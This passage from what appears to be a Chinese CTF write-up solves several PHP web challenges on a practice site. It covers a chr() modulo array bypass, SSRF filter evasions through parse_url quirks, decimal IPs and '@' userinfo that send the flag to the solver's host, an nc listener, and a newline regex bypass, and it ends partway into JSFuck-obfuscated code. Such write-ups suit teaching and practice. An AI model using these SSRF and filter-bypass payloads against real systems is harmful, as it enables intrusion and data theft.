unset($value);</span><br><span class="line">       else $username .&#x3D; chr($value[$i]);</span><br><span class="line"></span><br><span class="line">       if ($username &#x3D;&#x3D; &#39;15th_HackingCamp&#39; &amp;&amp; md5($password) &#x3D;&#x3D; md5(file_get_contents(&#39;.&#x2F;secret.passwd&#39;))) &#123;</span><br><span class="line">           echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">           echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这里我们需要最后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username &#x3D;&#x3D; &#39;15th_HackingCamp&#39; &amp;&amp; md5($password) &#x3D;&#x3D; md5(file_get_contents(&#39;.&#x2F;secret.passwd&#39;)</span><br></pre></td></tr></table></figure>
<p>password我们直接读</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;array2string.solveme.peng.kr&#x2F;secret.passwd</span><br></pre></td></tr></table></figure>
<p>即可获得（无法确定md5(file_get_contents(‘./secret.passwd’)是否以0或0e开头，所以不能用弱类型）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simple_passw0rd</span><br></pre></td></tr></table></figure>
<p>主要处理username：<br>首先GET参数不能有username，否则会unset<br>我们之后传入value数组来构造15th_HackingCamp<br>而：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br></pre></td></tr></table></figure>
<p>这里需要使用php中chr函数的特性来绕过条件：<br><strong>chr函数会自动将&gt;256的数mod256</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo chr(48+256); # &#39;0&#39;</span><br></pre></td></tr></table></figure>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;&quot;15th_HackingCamp&quot;</span><br><span class="line">payload&#x3D;&quot;&quot;</span><br><span class="line">for i in key:</span><br><span class="line">	payload+&#x3D;&quot;value[]&#x3D;&quot;+str(ord(i)+256)+&quot;&amp;&quot;</span><br><span class="line">print payload</span><br></pre></td></tr></table></figure>
<p>最后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]&#x3D;305&amp;value[]&#x3D;309&amp;value[]&#x3D;372&amp;value[]&#x3D;360&amp;value[]&#x3D;351&amp;value[]&#x3D;328&amp;value[]&#x3D;353&amp;value[]&#x3D;355&amp;value[]&#x3D;363&amp;value[]&#x3D;361&amp;value[]&#x3D;366&amp;value[]&#x3D;359&amp;value[]&#x3D;323&amp;value[]&#x3D;353&amp;value[]&#x3D;365&amp;value[]&#x3D;368&amp;password&#x3D;simple_passw0rd</span><br></pre></td></tr></table></figure>
<h2 id="0x09-Give-me-a-link-2"><a href="#0x09-Give-me-a-link-2" class="headerlink" title="0x09 Give me a link 2"></a>0x09 Give me a link 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;url&#39;]))&#123;</span><br><span class="line">       $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">       if(preg_match(&#39;&#x2F;_|\s|\0&#x2F;&#39;, $url))&#123;</span><br><span class="line">           die(&#39;Not allowed character&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $parse &#x3D; parse_url($url);</span><br><span class="line">       if(!preg_match(&#39;&#x2F;^https?$&#x2F;i&#39;, $parse[&#39;scheme&#39;]))&#123;</span><br><span class="line">           die(&#39;Not allowed scheme&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if(!preg_match(&#39;&#x2F;^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$&#x2F;i&#39;, $parse[&#39;host&#39;]))&#123;</span><br><span class="line">           die(&#39;Not allowed host&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if(!preg_match(&#39;&#x2F;\&#x2F;plz_give_me$&#x2F;&#39;, $parse[&#39;path&#39;]))&#123;</span><br><span class="line">           die(&#39;Not allowed path&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $socket &#x3D; socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">       if($socket &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">           die(&#39;Failed to create socket&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $host &#x3D; gethostbyname($parse[&#39;host&#39;]);</span><br><span class="line">       $port &#x3D; is_null($parse[&#39;port&#39;]) ? 80 : $parse[&#39;port&#39;];</span><br><span class="line"></span><br><span class="line">       if(socket_connect($socket, $host, $port) &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">           die(&#39;Failed to connect&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $send &#x3D; &quot;HEAD &#x2F;&quot;.$flag.&quot; HTTP&#x2F;1.1\r\n&quot;.</span><br><span class="line">           &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.</span><br><span class="line">           &quot;Connection: Close\r\n&quot;.</span><br><span class="line">           &quot;\r\n\r\n&quot;;</span><br><span class="line">       socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">       $recv &#x3D; socket_read($socket, 1024);var_dump($recv);</span><br><span class="line">       if(!preg_match(&#39;&#x2F;^HTTP\&#x2F;1.1 200 OK\r\n&#x2F;&#39;, $recv))&#123;</span><br><span class="line">           die(&#39;Not allowed response&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       socket_close($socket);</span><br><span class="line"></span><br><span class="line">       echo &#39;Okay, I sent the flag.&#39;, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;_|\s|\0&#x2F;&#39;, $url)#过滤掉下划线、空白字符、NULL字符</span><br><span class="line">preg_match(&#39;&#x2F;^https?$&#x2F;i&#39;, $parse[&#39;scheme&#39;])#匹配schema为http&#x2F;s开始</span><br><span class="line">preg_match(&#39;&#x2F;^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$&#x2F;i&#39;, $parse[&#39;host&#39;])#匹配host为localhost&#x2F;127.0.0.1</span><br><span class="line">preg_match(&#39;&#x2F;\&#x2F;plz_give_me$&#x2F;&#39;, $parse[&#39;path&#39;])#匹配路径为&#x2F;plz_give_me</span><br><span class="line">最后以HEAD发送flag到我们设定的host</span><br></pre></td></tr></table></figure>
<p>看到有几点：<br>首先过滤了下划线，却在路径中检测/plz_give_me</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $url&#x3D;urldecode(&quot;https:&#x2F;&#x2F;kirin-say.top:8000&#x2F;%10index.php&quot;);</span><br><span class="line"> echo parse_url($url)[&quot;path&quot;];  # &#x2F;_index.php</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>parse_url会将%10这类无效的url字符转换为下划线<br>host的通配符中可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$&#x2F;i  # |[^.]+</span><br></pre></td></tr></table></figure>
<p>可以通过将ip转换为纯数字绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ipaddressguide.com&#x2F;</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo ip2long(&quot;ip_addr&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>而后构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;givemealink2.solveme.peng.kr&#x2F;?url&#x3D;http:&#x2F;&#x2F;final_ip:port&#x2F;plz%10give%10me</span><br></pre></td></tr></table></figure>
<p>服务器端监听端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p  port</span><br></pre></td></tr></table></figure>
<p>即可接受到flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEAD &#x2F;flag&#123;51e22d08303881dd898f916cb1956c4e&#125; HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<h2 id="0x0A-Give-me-a-link"><a href="#0x0A-Give-me-a-link" class="headerlink" title="0x0A Give me a link"></a>0x0A Give me a link</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;url&#39;]))&#123;</span><br><span class="line">       $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">       if(preg_match(&#39;&#x2F;_|\s|\0&#x2F;&#39;, $url))&#123;</span><br><span class="line">           die(&#39;Not allowed character&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if(!preg_match(&#39;&#x2F;^https?\:\&#x2F;\&#x2F;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].&#39;&#x2F;i&#39;, $url))&#123;</span><br><span class="line">           die(&#39;Not allowed URL&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $parse &#x3D; parse_url($url);</span><br><span class="line">       if($parse[&#39;path&#39;] !&#x3D;&#x3D; &#39;&#x2F;plz_give_me&#39;)&#123;</span><br><span class="line">           die(&#39;Not allowed path&#39;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $ch &#x3D; curl_init();</span><br><span class="line">       curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;:&#x2F;&#x2F;&#39;.$parse[&#39;host&#39;].&#39;&#x2F;&#39;.$flag);</span><br><span class="line">       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">       curl_exec($ch);</span><br><span class="line">       curl_close($ch);</span><br><span class="line"></span><br><span class="line">       echo &#39;Okay, I sent the flag.&#39;, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>path依然像上一题一样绕过<br>不过这里host匹配的是url和$_SERVER[‘HTTP_HOST’]<br>直接控制台修改包会回显报错<br>只能想办法绕过<br>可以看到匹配的是$_SERVER[‘HTTP_HOST’]<br>但到最后访问的却是$parse[‘host’]<br>想到可以使用@在parse_url中绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $url&#x3D;urldecode(&quot;https:&#x2F;&#x2F;kirin-say.top:8000@127.0.0.1:80&#x2F;%10index.php&quot;);</span><br><span class="line">  echo var_dump(parse_url($url));</span><br><span class="line">  ?&gt;</span><br><span class="line">输出：</span><br><span class="line"> array(6) &#123;</span><br><span class="line">  [&quot;scheme&quot;]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;https&quot;</span><br><span class="line">  [&quot;host&quot;]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;127.0.0.1&quot;</span><br><span class="line">  [&quot;port&quot;]&#x3D;&gt;</span><br><span class="line">  int(80)</span><br><span class="line">  [&quot;user&quot;]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;kirin-say.top&quot;</span><br><span class="line">  [&quot;pass&quot;]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;8000&quot;</span><br><span class="line">  [&quot;path&quot;]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;&#x2F;_index.php&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;givemealink.solveme.peng.kr?url&#x3D;http:&#x2F;&#x2F;givemealink.solveme.peng.kr@ip_addr&#x2F;plz%10give%10me</span><br></pre></td></tr></table></figure>
<p>在服务器端即可收到flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag&#123;0983f9eaa0357982b2c0b4c6c037dfe3&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x0B-Replace-filter"><a href="#0x0B-Replace-filter" class="headerlink" title="0x0B Replace filter"></a>0x0B Replace filter</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   require __DIR__.&#39;&#x2F;lib.php&#39;;</span><br><span class="line"></span><br><span class="line">   if(isset($_GET[&#39;say&#39;]) &amp;&amp; strlen($_GET[&#39;say&#39;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">       $say &#x3D; preg_replace(&#39;&#x2F;^(.*)flag(.*)$&#x2F;&#39;, &#39;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#39;, $_GET[&#39;say&#39;]);</span><br><span class="line"></span><br><span class="line">       if(preg_match(&#39;&#x2F;give_me_the_flag&#x2F;&#39;, $say))&#123;</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">           echo &#39;What the f**k?&#39;;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>依然是绕过正则，看到源码的正则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(.*)flag(.*)$&#x2F;</span><br></pre></td></tr></table></figure>
<p>对于’.’:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">匹配除换行符 \n 之外的任何单字符</span><br></pre></td></tr></table></figure>
<p>所以这里构造%0a(换行符)进行绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?say&#x3D;&#x2F;%0agive_me_the_flag&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="0x0C-Hell-JS"><a href="#0x0C-Hell-JS" class="headerlink" title="0x0C Hell JS"></a>0x0C Hell JS</h2><p>打开页面<br>是一个用jsfuck混淆过的一个验证输入的js程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+([][[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(&#123;&#125;)[+[]]+(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]))+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[+[]]+([]+[])[(![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]()[(+!![]+[])+(!![]+!![])]+([]+[])[(![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]()[(+!![]+[])+(!![]+!![])])()[!![]+!![]+!![]+!![]+!![]])()[(![]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]